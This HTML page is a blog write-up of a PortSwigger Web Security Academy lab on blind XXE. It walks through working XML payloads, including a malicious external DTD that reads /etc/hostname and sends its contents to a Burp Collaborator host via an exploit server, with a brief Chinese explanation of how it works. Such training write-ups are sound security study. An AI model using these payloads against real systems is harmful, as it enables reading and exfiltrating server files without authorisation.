<!doctype html><html lang=en-us dir=ltr><head><meta charset=UTF-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=description content="
  Lab: Exploiting blind XXE to exfiltrate data using a malicious external DTD
  #


  tags: Portswigger Web Security Academy Web
  #


Description: This lab has a &ldquo;Check stock&rdquo; feature that parses XML input but does not display the result.
Goal: To solve the lab, exfiltrate the contents of the /etc/hostname file.
Hint: To prevent the Academy platform being used to attack third parties, our firewall blocks interactions between the labs and arbitrary external systems. To solve the lab, you must use the provided exploit server and/or Burp Collaborator&rsquo;s default public server.


  Recon
  #



Use the previous method
:::spoiler Payload"><meta name=theme-color media="(prefers-color-scheme: light)" content="#ffffff"><meta name=theme-color media="(prefers-color-scheme: dark)" content="#343a40"><meta name=color-scheme content="light dark"><meta property="og:url" content="https://bernie6401.github.io/security/practice/portswigger-web-security-academy/xxe/external-malicious-server/lab_-exploiting-blind-xxe-to-exfiltrate-data-using-a-malicious-external-dtd/"><meta property="og:site_name" content="SBK Hugo Site"><meta property="og:title" content="Lab: Exploiting blind XXE to exfiltrate data using a malicious external DTD"><meta property="og:description" content="Lab: Exploiting blind XXE to exfiltrate data using a malicious external DTD # tags: Portswigger Web Security Academy Web # Description: This lab has a “Check stock” feature that parses XML input but does not display the result. Goal: To solve the lab, exfiltrate the contents of the /etc/hostname file. Hint: To prevent the Academy platform being used to attack third parties, our firewall blocks interactions between the labs and arbitrary external systems. To solve the lab, you must use the provided exploit server and/or Burp Collaborator’s default public server. Recon # Use the previous method :::spoiler Payload"><meta property="og:locale" content="en_us"><meta property="og:type" content="article"><meta property="article:section" content="security"><meta property="article:tag" content="Portswigger Web Security Academy"><meta property="article:tag" content="Web"><title>Lab: Exploiting blind XXE to exfiltrate data using a malicious external DTD | SBK Hugo Site</title>
<link rel=icon href=/favicon.png><link rel=manifest href=/manifest.json><link rel=canonical href=https://bernie6401.github.io/security/practice/portswigger-web-security-academy/xxe/external-malicious-server/lab_-exploiting-blind-xxe-to-exfiltrate-data-using-a-malicious-external-dtd/><link rel=stylesheet href=/book.min.6c8b9d2a1fc95075ed7da46ca81060b39add8fff6741ac51259f768929281e2c.css integrity="sha256-bIudKh/JUHXtfaRsqBBgs5rdj/9nQaxRJZ92iSkoHiw=" crossorigin=anonymous><script defer src=/fuse.min.js></script><script defer src=/en.search.min.acdc41c8d39e6c69d70d8a23779875e0a3733fefead3e428d5344966bb12f562.js integrity="sha256-rNxByNOebGnXDYojd5h14KNzP+/q0+Qo1TRJZrsS9WI=" crossorigin=anonymous></script></head><body dir=ltr><input type=checkbox class="hidden toggle" id=menu-control>
<input type=checkbox class="hidden toggle" id=toc-control><main class="container flex"><aside class=book-menu><div class=book-menu-content><nav><h2 class=book-brand><a class="flex align-center" href=/><span>SBK Hugo Site</span></a></h2><div class="book-search hidden"><input type=text id=book-search-input placeholder=Search aria-label=Search maxlength=64 data-hotkeys=s/><div class="book-search-spinner hidden"></div><ul id=book-search-results></ul></div><script>document.querySelector(".book-search").classList.remove("hidden")</script></nav><script>(function(){var e=document.querySelector("aside .book-menu-content");addEventListener("beforeunload",function(){localStorage.setItem("menu.scrollTop",e.scrollTop)}),e.scrollTop=localStorage.getItem("menu.scrollTop")})()</script></div></aside><div class=book-page><header class=book-header><div class="flex align-center justify-between"><label for=menu-control><img src=/svg/menu.svg class=book-icon alt=Menu></label><h3>Lab: Exploiting blind XXE to exfiltrate data using a malicious external DTD</h3><label for=toc-control><img src=/svg/toc.svg class=book-icon alt="Table of Contents"></label></div><aside class="hidden clearfix"><nav id=TableOfContents><ul><li><ul><li></li></ul></li><li><a href=#recon>Recon</a></li><li><a href=#exp---通靈>Exp - <font color=FF0000>通靈</font></a></li><li><a href=#reference>Reference</a></li></ul></nav></aside></header><article class="markdown book-article"><h1 id=lab-exploiting-blind-xxe-to-exfiltrate-data-using-a-malicious-external-dtd>Lab: Exploiting blind XXE to exfiltrate data using a malicious external DTD
<a class=anchor href=#lab-exploiting-blind-xxe-to-exfiltrate-data-using-a-malicious-external-dtd>#</a></h1><h6 id=tags-portswigger-web-security-academy-web>tags: <code>Portswigger Web Security Academy</code> <code>Web</code>
<a class=anchor href=#tags-portswigger-web-security-academy-web>#</a></h6><ul><li>Description: This lab has a &ldquo;Check stock&rdquo; feature that parses XML input but does not display the result.</li><li>Goal: To solve the lab, exfiltrate the contents of the /etc/hostname file.</li><li>Hint: To prevent the Academy platform being used to attack third parties, our firewall blocks interactions between the labs and arbitrary external systems. To solve the lab, you must use the provided exploit server and/or Burp Collaborator&rsquo;s default public server.</li></ul><h2 id=recon>Recon
<a class=anchor href=#recon>#</a></h2><ol><li><p>Use the previous method
:::spoiler Payload</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-xml data-lang=xml><span style=display:flex><span><span style=color:#75715e>&lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-8&#34;?&gt;</span>
</span></span><span style=display:flex><span><span style=color:#75715e>&lt;!DOCTYPE stockCheck [&lt;!ENTITY % xxe SYSTEM &#34;http://d3hr4hyf51vbe69iuzp4czdzuq0ho6.burpcollaborator.net&#34;&gt;</span> %xxe; ]&gt;
</span></span><span style=display:flex><span><span style=color:#f92672>&lt;stockCheck&gt;</span>
</span></span><span style=display:flex><span>    <span style=color:#f92672>&lt;productId&gt;</span>
</span></span><span style=display:flex><span>        1
</span></span><span style=display:flex><span>    <span style=color:#f92672>&lt;/productId&gt;</span>
</span></span><span style=display:flex><span>    <span style=color:#f92672>&lt;storeId&gt;</span>
</span></span><span style=display:flex><span>        1
</span></span><span style=display:flex><span>    <span style=color:#f92672>&lt;/storeId&gt;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>&lt;/stockCheck&gt;</span>
</span></span></code></pre></div><p>:::
<img src=https://hackmd.io/_uploads/rJz-j9L42.png alt>
By using the previous method, we can not achieve our goal which is exfiltrating the host name of the server.</p></li><li><p>A new method
Refer to the hint, we can use the exploit server they provided.</p><ol><li>Copy the Collaborator Payload</li><li>Complete Malicious Server Payload and Store<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-xml data-lang=xml><span style=display:flex><span><span style=color:#75715e>&lt;!ENTITY % file SYSTEM &#34;file:///etc/hostname&#34;&gt;</span>
</span></span><span style=display:flex><span><span style=color:#75715e>&lt;!ENTITY % eval &#34;&lt;!ENTITY &amp;#x25; exfil SYSTEM &#39;http://BURP-COLLABORATOR-SUBDOMAIN/?x=%file;&#39;&gt;</span>&#34;&gt;
</span></span><span style=display:flex><span>%eval;
</span></span><span style=display:flex><span>%exfil;
</span></span></code></pre></div></li><li>Complete Intercept Packet Payload
Intercept the packet that you click <code>Check stock</code> button in arbitrary product page.
Copy and paste your malicious server URL to <code>YOUR-DTD-URL</code>, e.g. <code>https://exploit-{YOUR-RANDOM-URL}.exploit-server.net/exploit</code><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-xml data-lang=xml><span style=display:flex><span><span style=color:#75715e>&lt;!DOCTYPE foo [&lt;!ENTITY % xxe SYSTEM &#34;YOUR-DTD-URL&#34;&gt;</span> %xxe;]&gt;
</span></span></code></pre></div></li><li>Send packet and observe in Collaborator</li></ol></li></ol><h2 id=exp---通靈>Exp - <font color=FF0000>通靈</font>
<a class=anchor href=#exp---%e9%80%9a%e9%9d%88>#</a></h2><p>完整的流程有點複雜，我自己的想法是暫停的封包會因為parameter entity的reference，而觸發<code>%xxe</code>而和malicious server產生互動，此時malicious server就可以利用<code>%eval</code>和<code>%exfil</code>讓<code>SYSTEM "file:///etc/hostname"</code>這個指令被執行，並且把結果當作Collaborator的GET參數回傳給Burp Suite，此時我們就可以在Burp Suite的Collaborator中看到hostname是甚麼了。</p><p>:::spoiler Malicious Server Payload</p><pre tabindex=0><code class=language-xml! data-lang=xml!>&lt;!ENTITY % file SYSTEM &#34;file:///etc/hostname&#34;&gt;
&lt;!ENTITY % eval &#34;&lt;!ENTITY &amp;#x25; exfil SYSTEM &#39;http://ehzsiicgj29cs7nj8035q0r08reh26.burpcollaborator.net/?x=%file;&#39;&gt;&#34;&gt;
%eval;
%exfil;
</code></pre><p>:::
:::spoiler Packet Payload</p><pre tabindex=0><code class=language-xml! data-lang=xml!>&lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-8&#34;?&gt;
&lt;!DOCTYPE foo [&lt;!ENTITY % xxe SYSTEM &#34;https://exploit-0aae00dc044ebfc38406a3db012f0055.exploit-server.net/exploit&#34;&gt; %xxe;]&gt;
&lt;stockCheck&gt;
    &lt;productId&gt;
        1
    &lt;/productId&gt;
    &lt;storeId&gt;
        1
    &lt;/storeId&gt;
&lt;/stockCheck&gt;
</code></pre><p>:::
:::spoiler Success Screenshot
<img src=https://hackmd.io/_uploads/HkQPt5843.png alt>
:::</p><h2 id=reference>Reference
<a class=anchor href=#reference>#</a></h2><p><a href=https://youtu.be/wqwUqHA_AJE>XXE Lab Breakdown: Exploiting blind XXE to exfiltrate data using a malicious external DTD</a></p></article><footer class=book-footer><div class="flex flex-wrap justify-between"></div><script>(function(){function e(e){const t=window.getSelection(),n=document.createRange();n.selectNodeContents(e),t.removeAllRanges(),t.addRange(n)}document.querySelectorAll("pre code").forEach(t=>{t.addEventListener("click",function(){if(window.getSelection().toString())return;e(t.parentElement),navigator.clipboard&&navigator.clipboard.writeText(t.parentElement.textContent)})})})()</script></footer><div class=book-comments></div><label for=menu-control class="hidden book-menu-overlay"></label></div><aside class=book-toc><div class=book-toc-content><nav id=TableOfContents><ul><li><ul><li></li></ul></li><li><a href=#recon>Recon</a></li><li><a href=#exp---通靈>Exp - <font color=FF0000>通靈</font></a></li><li><a href=#reference>Reference</a></li></ul></nav></div></aside></main></body></html>